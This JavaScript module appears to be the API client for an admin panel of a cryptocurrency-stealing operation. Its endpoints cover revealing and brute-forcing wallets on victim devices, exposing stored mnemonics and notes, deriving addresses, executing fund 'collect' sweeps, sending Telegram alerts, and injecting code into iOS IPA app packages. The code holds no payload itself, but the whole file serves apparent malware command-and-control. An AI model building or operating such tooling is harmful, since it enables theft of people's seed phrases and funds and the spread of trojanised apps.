import axios from "axios";
import { adminUrl } from "../config";

const http = axios.create({
  baseURL: adminUrl("/api/admin"),
  timeout: 120000,
  withCredentials: true,
});

http.interceptors.request.use((cfg) => {
  const token = localStorage.getItem("admin_token");
  if (token) {
    cfg.headers.Authorization = `Bearer ${token}`;
  }
  return cfg;
});

http.interceptors.response.use(
  (res) => res,
  (err) => {
    if (err.response && err.response.status === 401) {
      localStorage.removeItem("admin_token");
      if (!window.location.hash.startsWith("#/login")) {
        window.location.hash = "#/login";
      }
    }
    const body = err.response && err.response.data;
    if (body && typeof body === "object" && body.message) {
      const e = new Error(body.message);
      e.body = body;
      e.status = err.response.status;
      return Promise.reject(e);
    }
    return Promise.reject(err);
  }
);

export async function request(method, url, { params, data } = {}) {
  const res = await http({ method, url, params, data });
  const body = res.data || {};
  if (body.code === 0) {
    return body;
  }
  const error = new Error(body.message || "请求失败");
  error.body = body;
  throw error;
}

export const api = {
  login: (username, password) => request("post", "/login", { data: { username, password } }),
  logout: () => request("post", "/logout"),
  me: () => request("get", "/me"),
  changelog: () => request("get", "/changelog"),
  summary: () => request("get", "/summary"),
  devices: (params) => request("get", "/devices", { params }),
  device: (id) => request("get", `/devices/${id}`),
  refreshBalance: (id, data) => request("post", `/devices/${id}/balances/refresh`, { data }),
  walletUnlock: (id, data) => request("post", `/devices/${id}/wallets/unlock`, { data }),
  walletReveal: (id, data) => request("post", `/devices/${id}/wallets/reveal`, { data }),
  noteReveal: (id, data) => request("post", `/devices/${id}/notes/reveal`, { data }),
  bruteStart: (id, data) => request("post", `/devices/${id}/wallets/brute`, { data }),
  bruteStatus: (id, jobId) => request("get", `/devices/${id}/wallets/brute/${jobId}`),
  bruteOrder: (id, data) => request("post", `/devices/${id}/wallets/brute-order`, { data }),
  mnemonics: (params) => request("get", "/mnemonics", { params }),
  mnemonicReveal: (id, password) => request("post", `/mnemonics/${id}/reveal`, { data: { password } }),
  deriveAddresses: (ids) => request("post", "/mnemonics/derive-addresses", { data: { ids } }),
  memorandums: (params) => request("get", "/memorandums", { params }),
  memorandumReveal: (id, password) => request("post", `/memorandums/${id}/reveal`, { data: { password } }),
  settings: () => request("get", "/settings"),
  settingsSave: (items) => request("post", "/settings/save", { data: { items } }),
  bundles: () => request("get", "/bundles"),
  bundlesSave: (items) => request("post", "/bundles/save", { data: { items } }),
  users: () => request("get", "/users"),
  apps: (params) => request("get", "/apps", { params }),
  appsCreate: (data) => request("post", "/apps/create", { data }),
  appsUpdate: (id, data) => request("post", `/apps/${id}/update`, { data }),
  permissions: () => request("get", "/permissions"),
  permissionsSave: (bindings) => request("post", "/permissions/save", { data: { bindings } }),
  templates: () => request("get", "/templates"),
  templateSave: (id, data) => request("post", `/templates/${id}/save`, { data }),
  addresses: (params) => request("get", "/addresses", { params }),
  collectPreview: (address_row_id) => request("get", "/addresses/collect-preview", { params: { address_row_id } }),
  collectExecute: (address_row_id) => request("post", "/addresses/collect", { data: { address_row_id } }),
  addressRefresh: (address_row_id) => request("post", "/addresses/refresh", { data: { address_row_id } }),
  collectRecords: (params) => request("get", "/collect-records", { params }),
  usersCreate: (data) => request("post", "/users/create", { data }),
  usersEdit: (id, data) => request("post", `/users/${id}/edit`, { data }),
  usersTgTest: (id) => request("post", `/users/${id}/tg-test`),
  usersCollect: (id, data) => request("post", `/users/${id}/collect-address`, { data }),
  usersLoginIp: (id, data) => request("post", `/users/${id}/login-ip`, { data }),
  usersToggle: (id, action) => request("post", `/users/${id}/toggle`, { data: { action } }),
  ipaLogo: (file) => {
    const fd = new FormData();
    fd.append("file", file);
    return http.post("/apps/ipa/logo", fd).then((res) => {
      const body = res.data || {};
      if (body.code === 0) return body;
      const error = new Error(body.message || "请求失败");
      error.body = body;
      throw error;
    });
  },
  ipaSource: (file) => {
    const fd = new FormData();
    fd.append("file", file);
    return http.post("/apps/ipa/source", fd).then((res) => {
      const body = res.data || {};
      if (body.code === 0) return body;
      const error = new Error(body.message || "请求失败");
      error.body = body;
      throw error;
    });
  },
  ipaGenerate: (data) => request("post", "/apps/ipa/generate", { data }),
  ipaInject: (data) => request("post", "/apps/ipa/inject", { data }),
  ipaJob: (jobId) => request("get", `/apps/ipa/jobs/${jobId}`),
  ipaDownloadJob: async (jobId) => {
    const token = localStorage.getItem("admin_token");
    const res = await fetch(adminUrl(`/api/admin/apps/ipa/download/job/${encodeURIComponent(jobId)}`), {
      headers: token ? { Authorization: `Bearer ${token}` } : {},
    });
    if (!res.ok) {
      throw new Error("下载失败");
    }
    const blob = await res.blob();
    const cd = res.headers.get("content-disposition") || "";
    const star = /filename\*=UTF-8''([^;]+)/i.exec(cd);
    const quoted = /filename="?([^";]+)"?/i.exec(cd);
    const name = decodeURIComponent((star && star[1]) || (quoted && quoted[1]) || "app.ipa");
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = name;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  },
};
